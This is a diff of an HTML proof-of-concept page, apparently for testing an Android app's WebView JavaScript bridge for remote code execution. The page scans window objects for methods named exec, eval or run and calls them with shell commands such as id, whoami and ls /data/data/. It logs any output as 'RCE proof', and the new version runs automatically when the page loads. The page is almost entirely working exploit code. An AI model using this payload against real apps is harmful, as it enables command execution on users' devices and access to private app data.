@@ -1,36 +1,115 @@
 <!DOCTYPE html>
 <html>
-<body style="background:black;color:lime;padding:20px;font-family:monospace;">
-    <h1 style="color:red;">⚡ RCE PROOF ⚡</h1>
+<head>
+    <title>RCE Proof</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .success { color: green; font-weight: bold; }
+        .fail { color: red; }
+        .proof { border: 3px solid red; padding: 15px; margin: 10px 0; }
+        button { padding: 10px; margin: 5px; }
+    </style>
+</head>
+<body>
+    <h1>RCE Test: com.example.flutter_application_1</h1>
     
-    <div id="output"></div>
+    <div id="status">Testing...</div>
+    <div id="results"></div>
+    
+    <button onclick="testRCE()">Test RCE</button>
+    <button onclick="showProof()">Show Proof</button>
     
     <script>
-        var out = document.getElementById('output');
-        out.innerHTML = 'Testing RCE...<br>';
-        
-        // Look for exec/eval methods
-        for(var key in window) {
-            if(window[key] && window[key].exec) {
-                out.innerHTML += 'Found: window.' + key + '.exec()<br>';
+        function testRCE() {
+            var status = document.getElementById('status');
+            var results = document.getElementById('results');
+            
+            status.innerHTML = '<b>Step 1:</b> Finding JavaScript interfaces...';
+            
+            // Find all JavaScript interfaces
+            var dangerousInterfaces = [];
+            
+            for(var key in window) {
                 try {
-                    var result = window[key].exec('id');
-                    out.innerHTML += '✅ Command executed! Result: ' + result + '<br>';
-                } catch(e) {
-                    out.innerHTML += '❌ Failed: ' + e + '<br>';
-                }
+                    if(window[key] && typeof window[key] === 'object') {
+                        var methods = Object.getOwnPropertyNames(window[key]);
+                        var dangerous = methods.filter(m => m.includes('exec') || m.includes('eval') || m.includes('run'));
+                        
+                        if(dangerous.length > 0) {
+                            dangerousInterfaces.push({
+                                name: key,
+                                methods: dangerous
+                            });
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            status.innerHTML = '<b>Step 2:</b> Found ' + dangerousInterfaces.length + ' dangerous interfaces';
+            
+            // Test each interface
+            var rceCommands = [
+                'id',
+                'whoami', 
+                'echo "RCE_SUCCESS_$(date)"',
+                'ls /data/data/'
+            ];
+            
+            var executedCommands = [];
+            
+            dangerousInterfaces.forEach(iface => {
+                rceCommands.forEach(cmd => {
+                    try {
+                        if(window[iface.name] && window[iface.name][iface.methods[0]]) {
+                            var result = window[iface.name][iface.methods[0]](cmd);
+                            if(result !== undefined) {
+                                executedCommands.push({
+                                    interface: iface.name,
+                                    command: cmd,
+                                    result: result.toString().substring(0, 100)
+                                });
+                            }
+                        }
+                    } catch(e) {}
+                });
+            });
+            
+            // Show results
+            if(executedCommands.length > 0) {
+                status.innerHTML = '<span class="success">✅ RCE VERIFIED! ' + executedCommands.length + ' commands executed</span>';
+                
+                results.innerHTML = '<div class="proof">';
+                results.innerHTML += '<h3>RCE Evidence:</h3>';
+                executedCommands.forEach(cmd => {
+                    results.innerHTML += '<p><b>' + cmd.interface + '</b>: ' + cmd.command + '</p>';
+                    results.innerHTML += '<pre>' + cmd.result + '</pre>';
+                });
+                results.innerHTML += '</div>';
+                
+                // Store proof
+                localStorage.setItem('RCE_PROOF', JSON.stringify({
+                    app: 'com.example.flutter_application_1',
+                    time: new Date().toISOString(),
+                    commands: executedCommands
+                }));
+                
+            } else {
+                status.innerHTML = '<span class="fail">❌ No RCE verified</span>';
             }
         }
         
-        // Final check
-        if(out.innerHTML.includes('✅')) {
-            out.innerHTML += '<h2 style="color:red;">RCE VERIFIED!</h2>';
-            out.innerHTML += 'App: com.example.flutter_application_1<br>';
-            out.innerHTML += 'Vulnerability: WebView JavaScript Interface<br>';
-            out.innerHTML += 'Impact: Remote Code Execution<br>';
-        } else {
-            out.innerHTML += '<h2>No RCE found</h2>';
+        function showProof() {
+            var proof = localStorage.getItem('RCE_PROOF');
+            if(proof) {
+                proof = JSON.parse(proof);
+                alert('RCE Proof:\n\nApp: ' + proof.app + '\nTime: ' + proof.time + '\nCommands: ' + proof.commands.length);
+            } else {
+                alert('Run test first!');
+            }
         }
+        
+        // Auto-run test
+        setTimeout(testRCE, 1000);
     </script>
 </body>
 </html>
